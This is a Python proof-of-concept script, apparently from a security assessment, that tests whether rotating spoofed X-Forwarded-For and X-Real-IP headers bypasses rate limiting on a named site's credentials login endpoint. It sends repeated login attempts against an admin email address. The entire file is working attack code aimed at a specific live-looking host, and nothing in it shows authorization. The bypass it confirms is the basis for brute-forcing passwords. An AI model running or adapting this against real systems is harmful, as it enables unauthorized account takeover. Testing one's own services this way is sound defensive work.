#!/usr/bin/env python3
"""
Rate Limit Bypass Test Script
Tests whether rotating X-Forwarded-For headers can bypass IP-based rate limiting
on the authentication endpoint.
"""

import requests
import json
import time

TARGET_AUTH = "https://v2.leaddrivecrm.org/api/auth/callback/credentials"
CSRF_URL = "https://v2.leaddrivecrm.org/api/auth/csrf"
EMAIL = "admin@leaddrive.com"
PASSWORD = "wrongpassword"
CALLBACK_URL = "/"

def fetch_csrf_token():
    """Fetch a fresh CSRF token from the auth endpoint."""
    resp = requests.get(CSRF_URL, timeout=10)
    data = resp.json()
    token = data.get("csrfToken", "")
    print(f"  [CSRF] Fetched token: {token[:20]}...")
    return token

def send_login_attempt(ip, csrf_token, attempt_num):
    """Send a single login attempt with the given X-Forwarded-For IP."""
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "User-Agent": "Mozilla/5.0 (SecurityTest)",
    }
    payload = (
        f"email={requests.utils.quote(EMAIL)}"
        f"&password={requests.utils.quote(PASSWORD)}"
        f"&csrfToken={requests.utils.quote(csrf_token)}"
        f"&callbackUrl={requests.utils.quote(CALLBACK_URL)}"
        f"&json=true"
    )
    resp = requests.post(TARGET_AUTH, headers=headers, data=payload, timeout=10, allow_redirects=False)
    snippet = resp.text[:120].replace("\n", " ").strip()
    print(f"  [{attempt_num:02d}] IP={ip:<15} Status={resp.status_code}  Body: {snippet}")
    return resp.status_code

def run_batch(label, ips, csrf_token):
    """Run a batch of login attempts and return list of status codes."""
    print(f"\n{'='*70}")
    print(f"BATCH: {label}")
    print(f"{'='*70}")
    statuses = []
    for i, ip in enumerate(ips, start=1):
        status = send_login_attempt(ip, csrf_token, i)
        statuses.append(status)
        time.sleep(0.3)  # small delay to avoid connection flooding
    return statuses

def main():
    print("=" * 70)
    print("  Authentication Rate Limit Bypass Test")
    print("  Target:", TARGET_AUTH)
    print("=" * 70)

    # ------------------------------------------------------------------ #
    # BATCH 1: Same IP (192.168.1.1) x 15 — should trigger rate limiting  #
    # ------------------------------------------------------------------ #
    print("\n[*] Fetching CSRF token for Batch 1...")
    csrf1 = fetch_csrf_token()

    same_ip = "192.168.1.1"
    same_ip_list = [same_ip] * 15

    statuses_same = run_batch("15 requests from SAME IP (192.168.1.1)", same_ip_list, csrf1)

    # ------------------------------------------------------------------ #
    # BATCH 2: Rotating IPs (1.2.3.1 – 1.2.3.15) — should NOT be limited #
    # ------------------------------------------------------------------ #
    print("\n[*] Fetching fresh CSRF token for Batch 2...")
    csrf2 = fetch_csrf_token()

    rotating_ips = [f"1.2.3.{i}" for i in range(1, 16)]

    statuses_rotating = run_batch("15 requests with ROTATING IPs (1.2.3.1–1.2.3.15)", rotating_ips, csrf2)

    # ------------------------------------------------------------------ #
    # SUMMARY                                                              #
    # ------------------------------------------------------------------ #
    same_429_count    = statuses_same.count(429)
    rotating_429_count = statuses_rotating.count(429)

    rate_limit_triggered = same_429_count > 0
    bypass_confirmed     = rate_limit_triggered and rotating_429_count == 0

    print(f"\n{'='*70}")
    print("  SUMMARY")
    print(f"{'='*70}")
    print(f"  Batch 1 (same IP)      : {len(statuses_same)} requests | 429s received: {same_429_count}")
    print(f"  Batch 2 (rotating IPs) : {len(statuses_rotating)} requests | 429s received: {rotating_429_count}")
    print()

    if rate_limit_triggered:
        print("  [TRIGGERED] Rate limit WAS triggered with the same IP.")
    else:
        print("  [NOT TRIGGERED] Rate limit was NOT triggered with the same IP.")
        print("                  (Server may not enforce IP-based rate limiting at all,")
        print("                   or the threshold is higher than 15 requests.)")

    if bypass_confirmed:
        print("  [BYPASS CONFIRMED] Rotating IPs bypassed the rate limit — VULNERABILITY CONFIRMED.")
    elif rate_limit_triggered and rotating_429_count > 0:
        print(f"  [BYPASS FAILED] Rotating IPs still received {rotating_429_count} x 429 — bypass did NOT work.")
    else:
        print("  [INCONCLUSIVE] Rate limit was not triggered in Batch 1; bypass test is not meaningful.")

    print(f"{'='*70}\n")

if __name__ == "__main__":
    main()
